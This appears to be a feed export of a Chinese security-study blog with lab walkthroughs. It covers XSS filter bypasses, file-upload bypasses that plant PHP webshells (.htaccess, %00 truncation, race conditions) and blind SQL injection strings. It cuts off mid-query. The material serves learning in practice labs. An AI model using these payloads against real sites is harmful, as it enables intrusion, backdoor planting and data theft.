    <title>XSS漏洞</title>
    <link href="http://example.com/2024/12/06/XSS%E6%BC%8F%E6%B4%9E/"/>
    <id>http://example.com/2024/12/06/XSS%E6%BC%8F%E6%B4%9E/</id>
    <published>2024-12-06T03:53:52.000Z</published>
    <updated>2024-12-09T08:33:46.243Z</updated>
    
    <content type="html"><![CDATA[<h1 id="分类及原理"><a href="#分类及原理" class="headerlink" title="分类及原理"></a>分类及原理</h1><p><a href="https://blog.csdn.net/m0_51468027/article/details/122757024">跨站脚本攻击XSS（最全最细致的靶场实战）_xss靶场-CSDN博客</a></p><p>它允许恶意用户将代码注入网页，其他用户在浏览网页时会受到影响，恶意用户利用XSS代码攻击成功后，可能得到很高的权限、私密网页内容、会话和cookie等各种内容。</p><p>黑盒XSS手工分析：</p><ol><li>页面中显示的数据找可控的（有些是隐藏的）。</li><li>利用可控的地方发送JS代码看执行情况。</li><li>成功执行即XSS，不成功则分析显示的输出。</li><li>分析为什么不能执行（实体化、关键字被删除等）。</li></ol><h2 id="反射型XSS"><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a>反射型XSS</h2><p>攻击者构造一个恶意链接，诱导用户传播和打开 。发出请求时，XSS代码出现在URL中，作为输入提交到服务器端，服务器端解析后响应，XSS代码随响应内容一起传回给浏览器，最后浏览器解析执行XSS代码。这个过程像一次反射，所以称反射型XSS。</p><p><img src="/../images/Pasted%20image%2020241206212443.png"></p><p>劫持流量实现恶意跳转：</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-property">href</span>=<span class="hljs-string">&quot;http://www.baidu.com&quot;</span>;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>那么所访问的网站就会被跳转到百度的首页。早在2011年新浪就曾爆出过严重的xss漏洞，导致大量用户自动关注某个微博号并自动转发某条微博。</p><p><img src="/../images/Pasted%20image%2020241206212728.png"></p><p>真实的XSS攻击语句，需要考虑输入和输出的格式。</p><p>输入可能会有过滤，输出可能会有其他符号的拼接造成攻击语句执行失败。如下图：<br><img src="/../images/Pasted%20image%2020241206213150.png"></p><p>注意标签闭合，可以参考这篇文章：<a href="https://www.freebuf.com/articles/web/340080.html">https://www.freebuf.com/articles/web/340080.html</a><br><img src="/../images/Pasted%20image%2020241206214158.png"></p><h2 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h2><p>存储型XSS和反射型XSS的差别仅在于，提交的代码会存储在服务器端（数据库、内存、文件系统等），下次请求目标页面时不用再提交XSS代码。最典型的例子就是留言板XSS，用户提交一条包含XSS代码的留言存储到数据库，目标用户查看留言板时，那些留言就会从数据库中加载出来并显示，于是触发了XSS攻击。</p><p><img src="/../images/Pasted%20image%2020241206215512.png"></p><h2 id="DOM型XSS"><a href="#DOM型XSS" class="headerlink" title="DOM型XSS"></a>DOM型XSS</h2><p><a href="https://www.freebuf.com/articles/web/306031.html">DOM型XSS - FreeBuf网络安全行业门户</a><br>不与后台服务器产生数据交互，是一种通过DOM操作前端代码输出的时候产生的问题，大部分属于反射型。</p><p><img src="/../images/Pasted%20image%2020241206221436.png"><br>DOM就是一个树状的模型，你可以编写Javascript代码根据DOM一层一层的节点，去遍历&#x2F;获取&#x2F;修改对应的节点,对象,值。</p><blockquote><p>[!NOTE]<br> 可能触发DOM型XSS的属性:<br>document.referer属性<br>window.name属性<br>location属性<br>innerHTML属性<br>document.write属性</p></blockquote><h1 id="XSS-Lab-安全防御-XSSFilter"><a href="#XSS-Lab-安全防御-XSSFilter" class="headerlink" title="XSS-Lab(安全防御-XSSFilter)"></a>XSS-Lab(安全防御-XSSFilter)</h1><p>如何绕过过滤触发JS代码？</p><ol><li><p><strong>无过滤</strong><br><img src="/../images/Pasted%20image%2020241207102927.png"></p></li><li><p><strong>标签闭合</strong></p></li></ol><p>查看源码，发现<code>&lt;</code>和<code>&gt;</code>被HTML字符实体化。</p><p><img src="/../images/Pasted%20image%2020241207104336.png"></p><p>输入的payload被赋值给value且未被实体化，可以考虑闭合value的参数值，和sql注入原理相同。</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml">&quot;&gt;<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert()<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>//<br></code></pre></td></tr></table></figure><ol start="3"><li><strong>单引号闭合并添加事件</strong></li></ol><p>发现value也被实体化。</p><p><img src="/../images/Pasted%20image%2020241207155933.png"></p><p>利用onfocus事件绕过：<br><img src="/../images/Pasted%20image%2020241207160659.png"></p><figure class="highlight 1c"><table><tr><td class="code"><pre><code class="hljs 1c">&#x27; onfocus=javascript:alert() &#x27; <span class="hljs-comment">//注意空格</span><br></code></pre></td></tr></table></figure><p> 然后再点击输入框触发onfocus事件即可。</p><ol start="4"><li><strong>双引号闭合并添加事件</strong></li></ol><p>发现依旧实体化，且value删除了<code>&lt;</code>和<code>&gt;</code>。<br><img src="/../images/Pasted%20image%2020241207161509.png"></p><p>同样添加onfocus事件可以绕过，注意闭合方式是双引号。</p><figure class="highlight 1c"><table><tr><td class="code"><pre><code class="hljs 1c"><span class="hljs-string">&quot; onfocus=javascript:alert() &quot;</span> <span class="hljs-comment">//注意空格</span><br></code></pre></td></tr></table></figure><ol start="5"><li><strong>事件关键字过滤，利用其他标签调用，双引号闭合</strong></li></ol><p>实体化，script被添加下划线，onfocus同样也被添加下划线。</p><p><img src="/../images/Pasted%20image%2020241207161911.png"></p><p>因此我们可以换一个标签来执行js代码：</p><p><img src="/../images/Pasted%20image%2020241207162737.png"></p><p>href属性的意思是 当标签a被点击的时候，就会触发执行转跳，上面是转跳到一个网站，我们还可以触发执行一段js代码：</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml">&quot;&gt; <span class="hljs-tag">&lt;<span class="hljs-name">a</span>  <span class="hljs-attr">href</span>=<span class="hljs-string">javascript:alert()</span>&gt;</span>xss<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>//<br></code></pre></td></tr></table></figure><p>之后点击xss，触发a标签href属性即可。</p><p><strong>6. 大小写绕过</strong></p><p>发现href也被添加下划线：</p><p><img src="/../images/Pasted%20image%2020241207164347.png"></p><p>查看服务器端源码：<br><img src="/../images/Pasted%20image%2020241207164643.png"></p><p>str_replace不区分大小写，所以可以利用大小写绕过：</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml">&quot;&gt; <span class="hljs-tag">&lt;<span class="hljs-name">a</span>  <span class="hljs-attr">hRef</span>=<span class="hljs-string">javascript:alert()</span>&gt;</span>xss<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>//<br></code></pre></td></tr></table></figure><ol start="7"><li><strong>双写绕过</strong></li></ol><p>发现关键字被删除：</p><p><img src="/../images/Pasted%20image%2020241207165338.png"></p><p>利用双写绕过：</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml">&quot;&gt; <span class="hljs-tag">&lt;<span class="hljs-name">a</span>  <span class="hljs-attr">hrhrefef</span>=<span class="hljs-string">javascscriptript:alert()</span>&gt;</span>xss<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>//<br></code></pre></td></tr></table></figure><ol start="8"><li><strong>unicode编码绕过</strong></li></ol><p>输入的值被插入到<code>&lt;a&gt;</code>标签的<code>href</code>属性值中：</p><p><img src="/../images/Pasted%20image%2020241207173721.png"></p><p> href属性自动解析Unicode编码：<br> <br><img src="/../images/Pasted%20image%2020241207175413.png"></p><ol start="9"><li><strong>内容检测</strong></li></ol><p>发现不合法，猜测这里可能对url地址做了匹配。只有包含正常的url地址才能添加到href属性值。 </p><p><img src="/../images/Pasted%20image%2020241207180258.png"></p><p>查看源码：<br><img src="/../images/Pasted%20image%2020241207180418.png"></p><p>因此要向传入的值里面添加http:&#x2F;&#x2F;并用注释符注释掉否则会执行不了无法弹窗:</p><figure class="highlight awk"><table><tr><td class="code"><pre><code class="hljs awk">javascript:alert()<span class="hljs-regexp">//</span>http:<span class="hljs-regexp">//</span><br></code></pre></td></tr></table></figure><p>此外还存在其他过滤，要将<code>javascript:alert()</code>进行unicode编码。</p><ol start="10"><li><strong>输入数据被隐藏</strong></li></ol><p><img src="/../images/Pasted%20image%2020241207181317.png"></p><p>查看源码，发现还有其他传参方法，且过滤了<code>&lt;</code>和<code>&gt;</code>：</p><p><img src="/../images/Pasted%20image%2020241207181500.png"></p><p>因为这里输入框被隐藏了，需要添加type&#x3D;”text”，构造payload：</p><figure class="highlight routeros"><table><tr><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">t_sort</span>=<span class="hljs-string">&quot; onfocus=javascript:alert() type=&quot;</span>text<br></code></pre></td></tr></table></figure><p>成功执行XSS：<br><img src="/../images/Pasted%20image%2020241207183505.png"></p><ol start="11"><li><strong>http头传值</strong></li></ol><p><img src="/../images/Pasted%20image%2020241207184312.png"></p><p>猜测第四个名为t_ref的input标签是http头referer的参数。</p><p>BurpSuite抓包，添加Referer头，payload为：</p><figure class="highlight applescript"><table><tr><td class="code"><pre><code class="hljs applescript"><span class="hljs-string">&quot; onfocus=javascript:alert() type=&quot;</span><span class="hljs-built_in">text</span><br></code></pre></td></tr></table></figure><p><img src="/../images/Pasted%20image%2020241207184947.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;分类及原理&quot;&gt;&lt;a href=&quot;#分类及原理&quot; class=&quot;headerlink&quot; title=&quot;分类及原理&quot;&gt;&lt;/a&gt;分类及原理&lt;/h1&gt;&lt;p&gt;&lt;a href=&quot;https://blog.csdn.net/m0_51468027/article/details</summary>
      
    
    
    
    
    <category term="WEB" scheme="http://example.com/tags/WEB/"/>
    
  </entry>
  
  <entry>
    <title>文件上传漏洞</title>
    <link href="http://example.com/2024/11/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"/>
    <id>http://example.com/2024/11/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/</id>
    <published>2024-11-23T11:06:56.000Z</published>
    <updated>2024-12-09T08:32:49.071Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前端JS验证"><a href="#前端JS验证" class="headerlink" title="前端JS验证"></a>前端JS验证</h1><p>要么看源码，要么抓包监听，如果上传文件的时候还没有抓取到数据包，但是浏览器就提示文件类型不正确的话，那么这个多半就是前端校验了：</p><p><img src="/../images/Pasted%20image%2020241128163111.png"></p><p>直接将 shell.php 重命名为 shell.png 上传，抓包的时候再将文件名修改为 shell.php 即可绕过前端限制，成功上传 webshell。或者直接在浏览器上禁用 JS。</p><h1 id="htaccess-文件"><a href="#htaccess-文件" class="headerlink" title=".htaccess 文件"></a>.htaccess 文件</h1><p><img src="/../images/Pasted%20image%2020241128190903.png"></p><figure class="highlight applescript"><table><tr><td class="code"><pre><code class="hljs applescript">AddType <span class="hljs-built_in">application</span>/x-httpd-php .png<br><span class="hljs-comment"># 把.png文件解析成php</span><br></code></pre></td></tr></table></figure><p>上传shell.php，抓包。<br><img src="/../images/Pasted%20image%2020241128204054.png"></p><p>文件名改成.htaccess，内容改成<code>AddType application/x-httpd-php .png</code> 。<br><img src="/../images/Pasted%20image%2020241128204150.png"></p><p>shell.php更改后缀名为.png再上传。<br><img src="/../images/Pasted%20image%2020241128204818.png"></p><p>成功上传后门。<br><img src="/../images/Pasted%20image%2020241128204935.png"></p><h1 id="MIME类型"><a href="#MIME类型" class="headerlink" title="MIME类型"></a>MIME类型</h1><p><img src="/../images/Pasted%20image%2020241129100728.png"></p><p>直接上传shell.php，抓包修改<code>Content-Type</code> 类型为：<code>image/png</code> 等合法的类型。</p><h1 id="文件头"><a href="#文件头" class="headerlink" title="文件头"></a>文件头</h1><p><img src="/../images/Pasted%20image%2020241129101402.png"></p><p>上传shell.php，更改MIME，并在文件头部加上GIF89a:</p><p><img src="/../images/Pasted%20image%2020241129102056.png"></p><h1 id="黑名单"><a href="#黑名单" class="headerlink" title="黑名单"></a>黑名单</h1><h2 id="嵌套"><a href="#嵌套" class="headerlink" title="嵌套"></a>嵌套</h2><p><img src="/../images/Pasted%20image%2020241129102313.png"></p><p>代码过滤不严：黑名单后缀设置为空，但是无递归，只检测一次，所以直接使用嵌套后缀：<code>shell.pphphp</code>。</p><h2 id="大小写"><a href="#大小写" class="headerlink" title="大小写"></a>大小写</h2><p><img src="/../images/Pasted%20image%2020241129103724.png"></p><p>函数缺陷：<code>str_replace</code> 和 <code>str_ireplace</code> 都是 PHP 中用于字符串替换的函数，它们之间的区别在于<code>str_replace</code>区分大小写，只有完全匹配的字符串会被替换，这样很容易就被大小写绕过。</p><p>因为 Windows 环境下不区分大小写，所以更改后缀名为.PHp ，但是 Linux 区分大小写。</p><h2 id="fuzz"><a href="#fuzz" class="headerlink" title="fuzz"></a>fuzz</h2><p>burpsuite抓包，发送到Intruder，php后缀添加载荷。点击Payloads，载入fuzzdbmaster项目中针对php后缀的字典。<br><img src="/../images/Pasted%20image%2020241129113732.png"></p><p>查看不同长度的响应，寻找可以绕过的后缀名。</p><h1 id="00截断"><a href="#00截断" class="headerlink" title="00截断"></a>00截断</h1><p><img src="/../images/Pasted%20image%2020241129104627.png"></p><p>抓包发现路径信息通过 GET 方式传递给后端，直接在路径后添加<code>/new.php%00</code>，这样保存的文件名就是这样的效果：</p><figure class="highlight gradle"><table><tr><td class="code"><pre><code class="hljs gradle"><span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/apache2/</span>htdocs<span class="hljs-regexp">/upload/</span><span class="hljs-keyword">new</span>.php%<span class="hljs-number">00</span>shell.jpg<br></code></pre></td></tr></table></figure><p>因为 <code>%00</code> 起到截断的作用，所以最终会在 upload 目录下面生成 new.php 的 webshell。</p><p>以上是GET型00截断，在url上%00自动解码一次。如果是POST型00截断，就需要手工解码：</p><p><img src="/../images/Pasted%20image%2020241129111932.png"></p><h1 id="条件竞争"><a href="#条件竞争" class="headerlink" title="条件竞争"></a>条件竞争</h1><p><img src="/../images/Pasted%20image%2020241129114114.png"></p><p>源码有逻辑缺陷，是先上传再判断。所以在删除之前，访问上传的用来生成恶意shell的文件，创建一个新的shell文件。</p><p>上传shell.php，抓包，发送到Intruder。<br><img src="/../images/Pasted%20image%2020241129121113.png"></p><p>因为上传了服务器就会删除，所以要不断上传，以便抓取访问shell.php的数据包。<br><img src="/../images/Pasted%20image%2020241129122118.png"><br><img src="/../images/Pasted%20image%2020241129122142.png"></p><p>与此同时，相同操作不断访问&#x2F;upload&#x2F;shell.php。</p><p>访问&#x2F;upload&#x2F;xiao.php，发现已存在，生成webshell成功。<br><img src="/../images/Pasted%20image%2020241129122818.png"></p><h1 id="二次渲染"><a href="#二次渲染" class="headerlink" title="二次渲染"></a>二次渲染</h1><p><img src="/../images/Pasted%20image%2020241129123104.png"></p><p>准备一个gif，上传之后再导出。打开010Editor，对比两个文件内容：<br><img src="/../images/Pasted%20image%2020241129124726.png"></p><p>灰色部分就是内容一致的部分，把后门代码插入到灰色部分：</p><p><img src="/../images/Pasted%20image%2020241129131905.png"></p><p>上传之后复制图片链接，利用文件包含漏洞，可执行任意命令:<br><img src="/../images/Pasted%20image%2020241129132636.png"></p><h1 id="move-uploaded-file-缺陷"><a href="#move-uploaded-file-缺陷" class="headerlink" title="move_uploaded_file 缺陷"></a>move_uploaded_file 缺陷</h1><p><img src="/../images/Pasted%20image%2020241129133014.png"></p><p>当 <code>$img_path</code> 可控的时候，将文件命名为<code>shell.php/.</code>，会把&#x2F;.忽略，就可以上传一个php文件：</p><p><img src="/../images/Pasted%20image%2020241129133400.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;前端JS验证&quot;&gt;&lt;a href=&quot;#前端JS验证&quot; class=&quot;headerlink&quot; title=&quot;前端JS验证&quot;&gt;&lt;/a&gt;前端JS验证&lt;/h1&gt;&lt;p&gt;要么看源码，要么抓包监听，如果上传文件的时候还没有抓取到数据包，但是浏览器就提示文件类型不正确的话，那么这个</summary>
      
    
    
    
    
    <category term="WEB" scheme="http://example.com/tags/WEB/"/>
    
  </entry>
  
  <entry>
    <title>基础知识</title>
    <link href="http://example.com/2024/11/22/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    <id>http://example.com/2024/11/22/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/</id>
    <published>2024-11-22T08:20:16.000Z</published>
    <updated>2024-12-09T08:32:44.213Z</updated>
    
    <content type="html"><![CDATA[<h1 id="JS"><a href="#JS" class="headerlink" title="JS"></a>JS</h1><p>流行的JS框架有Vue、NodeJS、jQuery、Angular等。</p><p>JS安全问题：</p><ol><li>源码泄漏</li><li>未授权访问&#x3D;JS里面分析更多的URL访问确定接口路径</li><li>敏感key泄漏&#x3D;JS文件中可能配置了接口信息（云应用，短信，邮件，数据库等）</li><li>API接口安全&#x3D;（代码中加密提交参数传递，更多的URL路径）</li></ol><p>浏览器F12搜索关键词寻找泄露路径：</p><figure class="highlight ruby"><table><tr><td class="code"><pre><code class="hljs ruby">src=  <br>path=  <br><span class="hljs-symbol">method:</span>“get”  <br>http.get(<span class="hljs-string">&quot;  </span><br><span class="hljs-string">method:“post”  </span><br><span class="hljs-string">http.post(&quot;</span>  <br><span class="hljs-variable">$.</span>ajax<br>[<span class="hljs-symbol">http:</span>/<span class="hljs-regexp">/service.httppost](http:/</span><span class="hljs-regexp">/service.httppost/</span>)<br>[<span class="hljs-symbol">http:</span>/<span class="hljs-regexp">/service.httpget](http:/</span><span class="hljs-regexp">/service.httpget/</span>)<br></code></pre></td></tr></table></figure><p>URLFinder-用于分析页面中的js与url,查找隐藏在其中的敏感信息或未授权api接口。<br><a href="https://github.com/pingc0y/URLFinder">https://github.com/pingc0y/URLFinder</a>  </p><h1 id="蜜罐"><a href="#蜜罐" class="headerlink" title="蜜罐"></a>蜜罐</h1><p>蜜罐是一种安全威胁的检测技术，其本质在于引诱和欺骗攻击者，并且通过记录攻击者的攻击日志来产生价值。安全研究人员可以通过分析蜜罐的被攻击记录推测攻击者的意图和手段等信息。攻击方可以通过蜜罐识别技术来发现和规避蜜罐。因此，我们有必要站在红队攻击者的角度钻研蜜罐识别的方式方法。</p><h1 id="CDN"><a href="#CDN" class="headerlink" title="CDN"></a>CDN</h1><p>通过在网络各处放置节点服务器所构成的在现有的互联网基础之上的一层智能虚拟网络。CDN系统能够实时地根据网络流量和各节点的连接、负载状况以及到用户的距离和响应时间等综合信息将用户的请求重新导向离用户最近的服务节点上。其目的是使用户可就近取得所需内容，解决 Internet网络拥挤的状况，提高用户访问网站的响应速度。</p><p>传统访问：用户访问域名–&gt;解析服务器 IP–&gt;访问目标主机<br>普通 CDN：用户访问域名–&gt;CDN 节点–&gt;真实服务器 IP–&gt;访问目标主机<br>带 WAF的 CDN：用户访问域名–&gt;CDN 节点（WAF）–&gt;真实服务器 IP–&gt;访问目标主机</p><p>使用不同区域ping，查看ping的ip结果是否唯一。若不唯一，则目标网站可能存在CDN。<br><a href="https://ping.chinaz.com/" title="https://ping.chinaz.com/">https://ping.chinaz.com/</a></p><h2 id="绕过CDN查找真实ip"><a href="#绕过CDN查找真实ip" class="headerlink" title="绕过CDN查找真实ip"></a>绕过CDN查找真实ip</h2><ul><li>有些站点的主站使用了CDN，某些子域名可能未使用。一般子域名极有可能和主站保持同一IP，所以扫描子域名可以查找到真实IP。</li><li>目标站点存在漏洞，如phpinfo敏感信息泄露，github信息泄露等。若存在web漏洞，服务器主动与我们发起请求连接，我们也能获取目标站点真实ip。例如xss、ssrf、命令执行反弹shell等。</li><li>查询ip与域名绑定历史记录，可能会发现使用CDN之前的目标ip。<a href="http://www.17ce.com/" title="http://www.17ce.com/">http://www.17ce.com/</a></li><li>很多站点都有发送邮件sendmail的功能，如Rss邮件订阅等。而且一般的邮件系统很多都是在内部，没有经过CDN的解析，在邮件源码里面就会包含服务器的真实 IP。</li><li>FOFA付费服务：云资产原始IP查询</li></ul><h1 id="红队信息收集"><a href="#红队信息收集" class="headerlink" title="红队信息收集"></a>红队信息收集</h1><p><a href="https://www.cnblogs.com/AffectedFish/p/16926959.html">https://www.cnblogs.com/AffectedFish/p/16926959.html</a><br><a href="https://xz.aliyun.com/t/10236?u_atoken=b43106d9a9c747e0863023033400e7bb&u_asig=1a0c399d17323596204497915e003a">https://xz.aliyun.com/t/10236?u_atoken=b43106d9a9c747e0863023033400e7bb&amp;u_asig=1a0c399d17323596204497915e003a</a></p><h1 id="身份验证技术"><a href="#身份验证技术" class="headerlink" title="身份验证技术"></a>身份验证技术</h1><h2 id="Cookie-Session"><a href="#Cookie-Session" class="headerlink" title="Cookie&amp;Session"></a>Cookie&amp;Session</h2><p>Cookie和Session都是用来在Web应用程序中跟踪用户状态的机制。</p><p>1.存储位置不同：<br>Cookie是存储在客户端（浏览器）上的，而Session是存储在服务器端的。</p><p>2.安全性不同：<br>Cookie存储在客户端上，可能会被黑客利用窃取信息，而Session存储在服务器上，更加安全。</p><p>3.存储容量不同：<br>Cookie的存储容量有限，一般为4KB，而Session的存储容量理论上没有限制，取决于服务器的硬件和配置。</p><p>4.生命周期不同：<br>Cookie可以设置过期时间，即便关闭浏览器或者重新打开电脑，Cookie仍然存在，直到过期或者被删除。而Session一般默认在浏览器关闭后就会过期。</p><p>5.访问方式不同：<br>Cookie可以通过JavaScript访问，而Session只能在服务器端进行访问。</p><p>6.使用场景不同：<br>Cookie一般用于存储小型的数据，如用户名和密码等信息。而Session一般用于存储大型的数据，如购物车、登录状态等信息。</p><h2 id="Token"><a href="#Token" class="headerlink" title="Token"></a>Token</h2><p>采用token机制的Web应用程序，用户在登录成功后会收到一个token，这个token可以在<strong>每次</strong>请求时发送给服务器进行身份验证。如果这时对用户名及密码进行抓包爆破，即使密码正确也无法成功登录，因为token对应不上。</p><p>保证了数据包的唯一性，防止暴力破解。</p><h1 id="DOM"><a href="#DOM" class="headerlink" title="DOM"></a>DOM</h1><h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><p>DOM 将 HTML 文档解析为一个由节点组成的树，称为 DOM 树。每个节点表示文档中的一个部分（例如元素、文本、属性等）。开发者可以通过JavaScript访问、修改和动态更新文档的内容、结构和样式。</p><p>例如：</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>Hello<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>World<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br></code></pre></td></tr></table></figure><p>结构：</p><figure class="highlight css"><table><tr><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">div</span><br>├── <span class="hljs-selector-tag">p</span><br>│   └── <span class="hljs-selector-tag">Text</span>: <span class="hljs-string">&quot;Hello&quot;</span><br>└── p<br>    └── Text: <span class="hljs-string">&quot;World&quot;</span><br><br></code></pre></td></tr></table></figure><h2 id="DOM-的常用操作"><a href="#DOM-的常用操作" class="headerlink" title="DOM 的常用操作"></a>DOM 的常用操作</h2><h3 id="获取对象"><a href="#获取对象" class="headerlink" title="获取对象"></a>获取对象</h3><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!-- 这是标题 --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;myHeader&quot;</span> <span class="hljs-attr">onclick</span>=<span class="hljs-string">&quot;getValue()&quot;</span>&gt;</span>这是标题<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><br><span class="hljs-comment">&lt;!-- 选择第一个 h1 元素 --&gt;</span><br>document.querySelector(&#x27;h1&#x27;)<br><br><span class="hljs-comment">&lt;!-- 选择所有具有 &#x27;id&#x27; 类的元素 --&gt;</span><br>document.querySelector(&#x27;.id&#x27;)<br><br><span class="hljs-comment">&lt;!-- 选择具有 &#x27;myHeader&#x27; id 的元素 --&gt;</span><br>document.querySelector(&#x27;#myHeader&#x27;)<br></code></pre></td></tr></table></figure><h3 id="获取对象属性"><a href="#获取对象属性" class="headerlink" title="获取对象属性"></a>获取对象属性</h3><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!-- HTML代码 --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;myHeader&quot;</span> <span class="hljs-attr">onclick</span>=<span class="hljs-string">&quot;getValue()&quot;</span>&gt;</span>这是标题<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><br><span class="hljs-comment">&lt;!-- JavaScript代码 --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">  <span class="hljs-comment">// 选择第一个 h1 元素</span></span><br><span class="language-javascript">  <span class="hljs-keyword">const</span> h1 = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelector</span>(<span class="hljs-string">&#x27;h1&#x27;</span>);</span><br><span class="language-javascript"></span><br><span class="language-javascript">  **<span class="hljs-comment">// 获取 h1 元素的 id 属性</span></span><br><span class="language-javascript">  <span class="hljs-keyword">const</span> id = h1.<span class="hljs-property">id</span>;</span><br><span class="language-javascript"></span><br><span class="language-javascript">  <span class="hljs-comment">// 输出 id 到控制台</span></span><br><span class="language-javascript">  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(id);**</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="利用DOM实现图片更新操作"><a href="#利用DOM实现图片更新操作" class="headerlink" title="利用DOM实现图片更新操作"></a>利用DOM实现图片更新操作</h2><p><img src="/../images/Pasted%20image%2020241124221938.png"></p><p>更换图片只需修改img.src：</p><p><img src="/../images/Pasted%20image%2020241124222246.png"></p><p>如果这里2.png是一个用户传递的变量，就会造成<strong>DOM型XSS</strong>。</p><h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><p>原理：接受的参数值未进行过滤直接带入SQL查询。</p><h2 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h2><p>在注入过程中，获取的数据不能回显至前端页面，常规的联合查询注入不行，我们需要利用一些方法进行判断或者尝试，这个过程称之为盲注。</p><p>1、基于布尔的SQL盲注-逻辑判断<br>regexp,like,ascii,left,ord,mid</p><p>注入逻辑：</p><ul><li>当条件为真时，页面正常返回；为假时，页面异常或没有数据返回。</li><li>攻击者可以通过逐字符猜测数据。</li></ul><figure class="highlight pgsql"><table><tr><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">and</span> length(<span class="hljs-keyword">database</span>())=<span class="hljs-number">7</span>;<br><span class="hljs-keyword">and</span> left(<span class="hljs-keyword">database</span>(),<span class="hljs-number">1</span>)=<span class="hljs-string">&#x27;p&#x27;</span>;<br><span class="hljs-keyword">and</span> left(<span class="hljs-keyword">database</span>(),<span class="hljs-number">2</span>)=<span class="hljs-string">&#x27;pi&#x27;</span>;<br><span class="hljs-keyword">and</span> substr(<span class="hljs-keyword">database</span>(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)=<span class="hljs-string">&#x27;p&#x27;</span>;<br><span class="hljs-keyword">and</span> substr(<span class="hljs-keyword">database</span>(),<span class="hljs-number">2</span>,<span class="hljs-number">1</span>)=<span class="hljs-string">&#x27;i&#x27;</span>;<br><span class="hljs-keyword">and</span> ord(left(<span class="hljs-keyword">database</span>(),<span class="hljs-number">1</span>))=<span class="hljs-number">112</span>;<br></code></pre></td></tr></table></figure><p>2、基于时间的SQL盲注-延时判断<br>if,sleep</p><p>注入逻辑：</p><ul><li>如果条件成立，则执行 SLEEP() 或类似延迟函数，页面响应时间增加；否则立即返回。</li><li>攻击者逐字符猜测数据库名、表名等信息。</li></ul><figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">and</span> sleep(<span class="hljs-number">1</span>);<br><span class="hljs-attribute">and</span> if(<span class="hljs-number">1</span>&gt;<span class="hljs-number">2</span>,sleep(<span class="hljs-number">1</span>),<span class="hljs-number">0</span>);<br><span class="hljs-attribute">and</span> if(<span class="hljs-number">1</span>&lt;<span class="hljs-number">2</span>,sleep(<span class="hljs-number">1</span>),<span class="hljs-number">0</span>);<br><span class="hljs-attribute">and</span> if(length(database())=<span class="hljs-number">7</span>,sleep(<span class="hljs-number">10</span>),<span class="hljs-number">0</span>);<br><span class="hljs-attribute">and</span> if(and left(database(),<span class="hljs-number">2</span>)=&#x27;pi&#x27;,sleep(<span class="hljs-number">10</span>),<span class="hljs-number">0</span>);<br></code></pre></td></tr></table></figure><p>3、基于报错的SQL盲注-报错回显</p><p>数据库通常会在语法错误或非法操作时抛出详细的错误消息。通过构造特定的恶意 SQL 语句，使数据库抛出错误，从错误中提取信息。</p><figure class="highlight pgsql"><table><tr><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">SELECT</span> 